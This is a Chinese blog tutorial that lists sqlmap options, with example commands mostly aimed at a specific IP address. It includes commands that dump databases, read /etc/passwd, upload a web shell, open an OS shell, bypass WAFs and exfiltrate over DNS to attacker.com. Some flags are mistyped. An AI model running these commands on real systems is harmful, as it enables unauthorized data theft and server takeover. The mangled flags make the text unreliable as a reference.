# 原创
：  网络安全工具篇之Sqlmap（史上最全，收藏这篇就够了）

# 网络安全工具篇之Sqlmap（史上最全，收藏这篇就够了）

### 一、Sqlmap介绍

 [免费领取网络安全资料](https://docs.qq.com/doc/DRHFnVWJjTU50ZVhG) 

### 二、基本参数

1.—update： 更新

> 
**python sqlmap.py —update**

1.  -h：查看常用参数 
> 
**python sqlmap.py -h**

1.  -hh：查看全部参数 
> 
**python sqlmap.py -h**

1.  —version：查看版本 
> 
**python sqlmap.py —version**

1.  -v：查看执行过程信息，默认是1，一共 0 ~ 6 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ -v 3**

1.  -d ： mysql表示数据库类型、user:password表示目标服务器的账号和密码，@后表示要连接的服务器，3306表示端口，zakq_ dababasename表示连接的数据库名称 
> 
**python sqlmap.py -d “mysql://root:root@192.168.126.128:3386/zkaq_databasename”**

1.  —wizard ： 向导式 
> 
**python sqlmap.py —wizard**


### 三.确定目标 
1.  -u “URL” ： 指定URL，get请求方式 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“**

1.  -m url.txt :：使用一个包含多个url的文件进行扫描。若有重复，sqlmap会自动识别成一个。 
> 
**python sqlmap.py -m url.txt**

1.  -g ：扫描，使用Google语法得到的url。 
> 
**python sqlmap.py -g “inurl:\”.php?id=1\”**

1.  -r request.txt ： Post提交方式，使用HTTP请求文件，该文件可从BurpSuit中导出。（BurpSuit抓包—&gt;将请求复制到txt中即可） 
> 
**python sqlmap.py -r request.txt**

1.  -l log.txt —scope=”正则表达式” ：Post提交方式，使用BurpSuit的log文件。（Options—&gt;Misc—&gt;Logging—&gt;Proxy—&gt;勾选Request ，scope的作用是 基于正则表达式去过滤日志内容，筛选需要扫描的对象。 
> 
**python sqlmap.py -l log.txt —scope=”(www)?.target.(com|net|arg)”**

1.  -c sqlmap.conf ：使用配置文件进行扫描 (sqlmap.conf与sqlmap.py 在同一目录) 
> 
**python sqlmap.py -c sqlmap.conf**

1.  -u “URL” ： 对于这种写法，加*号扫描 
> 
**python sqlmap.py -u “[http://target_url/param1/value1*/param2/value2](/param1/value1*/param2/value2)“**


### 四.配置目标参数 
1.  -p ：指定要扫描的参数 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123](http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123)“ -p “username,id”**

1.  —skip： 排除指定的扫描参数 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123](http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123)“ —skip “username,id”**

1.  —data： 指定扫描的参数，get/post都适用 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123](http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123)“ —date=”username=admin&amp;password=123”**

1.  —param-del：改变分隔符，默认是&amp;，因为有些网站不实用&amp;传递多个数据。 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123](http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123)“ —date=”username=admin;password=123” —param-del=”;”**

1.  —cookie ：使用cookie的身份认证 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —cookie=”security=low;PHPSESSID=121123131”**

1.  —drop-set-cookie： 有时候发起请求后，服务器端会重新Set-cookie给客户端，SQLmap默认会使用新的cookie，这时候可以设置此参数，表示还是用原来的cookie。 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —cookie=”security=low;PHPSESSID=121123131 —-drop-set-cookie”**

1.  —user-agent ：使用浏览器代理头 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —user-agent=”aaaaaaaaa”**

1.  —random-agent： 使用随机的浏览器代理头 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —random-agent**

1.  —host ：指定主机头 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —host=”aaaaa”**

1.  —referer=”aaaaaa” ： 指定referer头 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —referer=”aaaaaa”**

1.  —headers ：有些网站需要特定的头来身份验证 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —headers=”host:aaaa\nUser-Agent:bbbb”**

1.  —method ：指定请求方式，还有POST 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —method=GET**

1.  —auth-type ， —auth-cred： 身份认证，还有Digest、NTLM 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —auth-type Basic —auth-cred “user:pass”**

1.  —auth-file=”ca.PEM” ： 使用私钥证书去进行身份认证，还有个参数—auth-cert，暂时不知道怎么用，没遇到过 1.  —proxy ：使用代理去扫描目标，代理软件占用的端口在8080 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —proxy=”[http://127.0.0.1:8080/](http://127.0.0.1:8080/)“**

1.  —proxy-cred：使用代理时的账号和密码 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —proxy=”[http://127.0.0.1:8080/](http://127.0.0.1:8080/)“ —proxy-cred=”name:pass”**

1.  —ignore-proxy ： 忽略系统级代理设置，通常用于扫描本地网络目标，本网段。 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —ignore-proxy**


 

### 五、配置目标行为 
1.  —force-ssl：使用HTTPS连接进行扫描 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —force-ssl**

1.  —delay：每次http请求之间的延迟时间，默认无延迟 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —delay=”3”**

1.  —timeout：请求超时时间，浮点数，默认为30秒 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —timeout=”10”**

1.  —retries：http连接的重试次数，默认3次 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —retries=”1”**

1.  —randomize：长度、类型与原始值保持一致的情况下,随机参数的取值。比如id=100 -&gt; id=1?? 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —randomize=”id”**

1.  —safe-url：检测盲注阶段时，sqlmap会发送大量失败请求，可能导致服务器端销毁session 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —safe-url=”URL”**

1.  —safe-freq ： 每发送多少次注入请求后，发送一次正常请求，配合—safe-url使用。 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —safe-freq**

1.  —time-sec： 基于时间的注入检测相应延迟时间，默认5秒 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —time-sec=”3”**

1.  —union-cols ：默认联合查询1-10列，随—level增加，最多支持100列。 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —union-cols 6-9**

1.  —union-char：联合查询默认使用null，极端情况下可能失败，此时可以手动执行数值 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —union-char 123**

1.  —technique US ： 指定检测注入时所用技术，默认情况下Sqlmap会使用自己支持的全部技术进行检测，有B、E、U、S、T、Q 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —technique US**


### 六、优化探测过程 
1.  —level 2：检测cookie中是否含有注入、3：检测user-agent、referer是否含有注入、5：检测host是否含有注入 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —level 3**

1.  —risk 默认1，最高4，等级高容易造成数据被篡改风险 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —risk 3**

1.  —predict-output ： 优化检测方法，不断比对大数据，缩小检测范围，提高效率，与—threads参数不兼容 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —predict-output**

1.  —keep-alive ： 长连接、性能好，避免重复建立的网络开销，但大量长连接会占用服务器资源。与—proxy参数不兼容 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —keep-alive**

1.  —null-connection ： 只获取页面大小的值，通常用于盲注判断真假，与—text-only 不兼容 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —null-connection**

1.  -o ： 直接开启以上三个(—predict-output、—keep-alive、—null-connection) 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ -o**

1.  —threads=7 ：提高并发线程，默认为1，建议不要超过10，否则影响站点可用性，与—predict-out不兼容 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —threads=7**

1.  —string=”woaini” ： 页面比较，用于基于布尔注入的检测，因为有时候页面随时间阈值变化，此时需要人为指定标识真假的字符串，除此之外，还有—not-string=”woaini”、—code=200、—titles=”Welcome”等等 
> 
python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —string=”woaini”


### 七、特定目标环境
1.  —skip-urlencode ：默认get传参会使用URL编码，但有些服务器没按规范，使用原始字符提交数据。 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —skip-urlencode**

1.  —eval ：在提交前，对参数进行pyhton的处理，提升效率 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”**

1.  —dbms ： 指定数据库类型，还可以加上版本 Mysql&lt;5.0&gt; 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003](http://59.63.200.79:8003/)**/?id=1” —dbms=”Mysql”

1.  —os ： 指定操作系统，还可以是Linux 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —os=”Windows”**

1.  —invalid-bignum ：sqlmap默认使用负值让参数进行失效，该参数使用最大值让参数失效，比如 id=9999999 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —invalid-bignum**

1.  —invalid-logical ：使用布尔值，比如 id 13 and 18=19 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —invalid-logical**

1.  —no-cast： 将sqlmap取出的数据转换为字符串，并用空格替换NULL结果，在老版本时需要开启此开关。 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —no-cast**

1.  —no-escape：为了逃逸服务器端对sqlmap的检测，默认使用char()编码替换字符串。本参数将关闭此功能。比如 select ‘foo’ —&gt; select cahr(102) + char(111) + char(111) 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —no-escape**

1.  —prefix：添加前缀 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —prefix “‘)’”**

1.  —suffix ：添加后缀 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —suffix “AND (‘abc’=’abc”**

1.  —tamper：使用脚本，绕过IPS、WAF等 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —tamper=”tamper/between.py,tamper/randomcase.py”**

1.  —dns-domain：攻击者控制了DNS服务器，可以提高取出数据的效率 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —dns-domain attacker.com**

1.  —second-order：在一个页面注入的结果，从另外一个页面提现出来 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —second-order “[1.1.1.1 — The free app that makes your Internet faster.](http://1.1.1.1/b.php)“**


### 八、查看基本信息
1.  -f ：扫描时加入数据库指纹检测 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ -f**

1.  -b ： 查看数据库的版本信息 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ -b**


### 九、查看数据信息
1.  —users ： 查询所有的数据库账号 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —users**

1.  —dbs ： 查询所有数据库 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —dbs**

1.  —schema ： 查询源数据库（包含定义数据的数据） 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —schema**

1.  -a ： 查询当前user、当前数据库、主机名、当前user是否是最大权限管理员、数据库账号等 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ -a**

1.  -D dvwa： 指定数据库 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ -D database_name**

1.  —current-user ： 查询当前数据库用户 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —current-user**

1.  —current-db ： 查询当前数据库 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —current-db**

1.  —hostname ： 查看服务器的主机名 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —hostname**

1.  —Privileges -U username ： 查询username的权限 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —Privileges -U username**

1.  —roles ：查询角色 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —roles**

1.  —tables ： 查看所有的表 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —tables**

1.  -T ： 指定表 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ -T table_name**

1.  —columns ： 查看所有的字段 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —columns**

1.  -C ： 指定字段 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ -C column_name**

1.  —count ： 计数，查看有多少条数据 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —count**

1.  —exclude-sysdbs ： 排除系统库 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —exclude-sysdbs**

1.  —dump ： 查看数据 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —dump**

1.  —start 3 ： 查看第三条 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —start 3**

1.  —end 4 ： 查看第四条 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —end 4**

1.  —sql-query “select * from users” ： 执行语句 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —sql-query “select * from users”**

1.  —common-columns ： 暴力破解字段，应用于两种情况：①无权限读取数据。②mysql&lt;5.0 ，没有infomation_schema库 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —common-columns**

1.  —common-tables ： 暴力破解表 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —common-tables**


### 十.其他参数
1.  —batch ： 自动选是 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —batch**

1.  —charset：强制字符编码 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —charset=GBK**

1.  —crawl：爬站深度 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —crawl=3**

1.  —csv-del：指定csv文件的分隔符 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —csv-del=”;”**

1.  —flush-session ： 清空session 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —flush-session**

1.  —force-ssl ： 强制使用HTTPS 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —force-ssl**

1.  —fresh-queries ： 重新检测，不使用本地已查询的数据 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —fresh-queries**

1.  —hex ： 以16进制的形式编码dump出来的数据 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —hex**

1.  —parse-errors ： 分析和显示数据库内建报错信息 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —parse-errors**

1.  —answer ： 回答 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —answer=”extending=N”**

1.  —check-waf ： 检测WAF/IPS/IDS 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —check-waf**

1.  —hpp ： 绕过WAF/IPS/IDS 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —hpp**

1.  —identify-waf ： 彻底检测WAF/IPS/IDS 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —identify-waf**

1.  —mobile ： 模拟智能手机设备 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —mobile**

1.  —purge-output ： 清除output文件夹 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —purge-output**

1.  —smart ： 当有大量检测目标时，只选择基于错误的检测结果 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —smart**


### 十一.高级注入参数
1.  —file-read：文件系统访问 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —file-read=”/etc/passwd”**

1.  —file-write、—file-dest ：写文件到目标位置 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —file-write=”shell.php” —file-dest “/tmp/shell.php”**

1.  —sql-shell ： 进入交互式mysql窗口 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —sql-shell**

1.  —os-shell ： 进入命令行窗口 
> 
**python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](http://59.63.200.79:8003/?id=1)“ —os-shell**

1.  使用Tor代理 
> 
**sqlmap.py -u [http://navisec.it/123.asp?id=1](http://navisec.it/123.asp?id=1) —tor -tor-type=SOCKS5 —tor-port=9050 —check-tor**


[免费领取网络安全资料](https://docs.qq.com/doc/DRHFnVWJjTU50ZVhG) 

 

 

 

 

 

 

 

 

 

 
